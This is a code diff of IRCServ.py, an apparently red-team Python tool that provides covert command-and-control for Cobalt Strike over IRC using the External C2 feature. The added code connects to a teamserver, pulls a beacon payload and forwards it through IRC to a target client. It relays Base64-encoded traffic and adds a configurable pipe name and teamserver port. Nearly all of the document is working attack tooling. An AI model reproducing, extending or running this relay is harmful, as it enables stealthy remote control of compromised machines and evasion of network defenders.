@@ -1,17 +1,13 @@
 """
     IRCServ.py
     by Lt Daniel Fitzgerald
-    Red Flag 19-3 - July 2019
+    Jan 2020
 
     Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
     
-    This was created as a fallback to get basic functionality in a short amount of development time.
-    It is not complete and has errors.
     Instead of using cloakify to convert Base64 messages to normal looking strings, it just sends the Base64 
-    message over IRC.
-
-    Update 15 Jan 2020: Fixed bug causing crash on large data transfer.
-    
+    message over IRC. I intend to finish development on cloakify feature but keep in mind this will 
+    drastically increase the size of data being sent and in turn the number of packets.    
 """
 import argparse
 import base64
@@ -26,14 +22,15 @@ class IRCinfo:
     """
     @brief Class to hold info for IRC session
     """
-    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick, traffic_str, len_str, start_str):
+    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick, traffic_str, len_str, start_str, pipe_str):
         """
 
+        :param src_ip: IP address of CS Teamserver
         :param ip: IP address of IRC server
         :param port: Port of IRC server
         :param nick: NICK program will connect as in irc
         :param op_nick: NICK program will use to auth as an operator
-        :param password: PASS program will use to auth as an operator
+        :param op_password: PASS program will use to auth as an operator
         :param user: USER program will connect as
         :param real_name: REALNAME program will connect as
         :param channel: CHANNEL program will auto-join
@@ -41,6 +38,7 @@ class IRCinfo:
         :param traffic_str: String that will prefix the B64 encoded message.
         :param len_str: String that will prefix the int representing the length of the incomming B64 encoded data.
         :param start_str: String that will tell the server to start transmitting data.
+        :param pipe_str: String to name the pipe to the beacon. (i.e. mIRC)
         """
         self.src_ip = src_ip
         self.ip = ip
@@ -55,6 +53,7 @@ class IRCinfo:
         self.traffic_str = traffic_str
         self.len_str = len_str
         self.start_str = start_str
+        self.pipe_str = pipe_str
         
 
 class ExternalC2Controller:
@@ -313,34 +312,44 @@ class ExternalC2Controller:
         """
 
         :param ircinfo: Class with user IRC info
-        :return: 1 on error
         """
-        # First thing, wait for a connection from our custom beacon
+        # Connecting to TS first, if we fail we do so before connecting to target irc server
+        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
+        #BUG: I wasnt using src_ip and had hardcoded the teamserver to be on the same box
+        #self._socketTS.connect(("127.0.0.1", self.port))
+        try:
+            self._socketTS.connect((ircinfo.src_ip, self.port))
+        except:
+            print("Teamserver connection failed. Exiting.")
+            return
+        
+        # Send out config options
+        self.send_to_ts("arch=x86".encode())
+        self.send_to_ts("pipename={}".format(ircinfo.pipe_str).encode())
+        self.send_to_ts("block=500".encode())
+        self.send_to_ts("go".encode())
+
+        # Receive the beacon payload from CS to forward to our target
+        data = self.recv_from_ts()
+
+        # Now that we have our beacon to send, wait for a connection from our target
         self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._socketBeacon.connect((ircinfo.ip, ircinfo.port))
+        try:
+            self._socketBeacon.connect((ircinfo.ip, ircinfo.port))
+        except:
+            print("IRC connection failed. Exiting.")
+            return
 
         self.connect_to_irc(ircinfo)
         self.join_channel(ircinfo)
         self.become_oper(ircinfo)
 
+        print("Waiting for client to send start string.")
         if self.wait_for_client(ircinfo):
             print("Received C2 connection")
         else:
             print("Link Closed.")
-            return False
-
-        # Now we have a beacon connection, we kick off comms with CS External C2
-        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
-        self._socketTS.connect(("127.0.0.1", self.port))
-
-        # Send out config options
-        self.send_to_ts("arch=x86".encode())
-        self.send_to_ts("pipename=mIRC".encode())
-        self.send_to_ts("block=500".encode())
-        self.send_to_ts("go".encode())
-
-        # Receive the beacon payload from CS to forward to our custom beacon
-        data = self.recv_from_ts()
+            return
 
         # Send beacon payload to target
         self.sendToBeacon(ircinfo, data)
@@ -360,8 +369,11 @@ class ExternalC2Controller:
             self.sendToBeacon(ircinfo, data)
 
 
-parser = argparse.ArgumentParser(description='Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.')
-parser.add_argument('src_ip', help="IP of teamserver (or redirector)")
+parser = argparse.ArgumentParser(description='Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.',
+                                 usage="\n"
+                                       "%(prog)s [SRC_IP] [IRC_IP] [IRC_PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REAL_NAME] [CHANNEL] [CLIENT_NICK] [TRAFFIC_STR] [LEN_STR] [START_STR]"
+                                       "\nUse '%(prog)s -h' for more information.")
+parser.add_argument('src_ip', help="IP of teamserver (or redirector). WARNING: This program may error if it is not run on the same box as the teamserver.")
 parser.add_argument('irc_ip', help="IP of IRC server, not teamserver. (i.e. UnrealIRCd server)")
 parser.add_argument('irc_port', type=int, help="Port number of IRC server. Typically 6667")
 parser.add_argument('nick', help="Name your server will use in IRC")
@@ -374,7 +386,9 @@ parser.add_argument('client_nick', help="Nick of client you will talk to. You ne
 parser.add_argument('traffic_str', help="String that will prefix the B64 encoded message. (i.e. TrafficGen) This will be used to find the data in the string. It must be the same as the client.")
 parser.add_argument('len_str', help="String that will prefix the int representing the length of the incomming B64 encoded data. (i.e. Len) This will be used to find the lenth. It must be the same as the client.")
 parser.add_argument('start_str', help="String that will tell the server to start transmitting data. It must be the same as the client.")
+parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client. (i.e. mIRC)")
+parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 args = parser.parse_args()
-controller = ExternalC2Controller(2222)
-ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick, args.traffic_str, args.len_str, args.start_str)
+controller = ExternalC2Controller(args.teamserver_port)
+ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick, args.traffic_str, args.len_str, args.start_str, args.pipe_str)
 controller.run(ircinfo)
